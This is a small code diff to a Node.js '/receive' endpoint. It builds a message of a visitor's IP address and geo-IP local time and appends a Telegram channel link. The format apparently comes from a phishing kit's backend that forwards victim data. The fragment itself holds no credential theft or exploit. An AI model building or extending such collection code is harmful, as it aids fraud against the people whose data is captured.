@@ -108,7 +108,7 @@ app.post('/receive', async (req, res) => {
     
     message += `🌍 GEO-IP INFO\n` +
 			`IP ADDRESS       : ${ipAddress}\n` +
-		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`+
         `💬 Telegram: https://t.me/UpdateTeams\n`;
 
   }
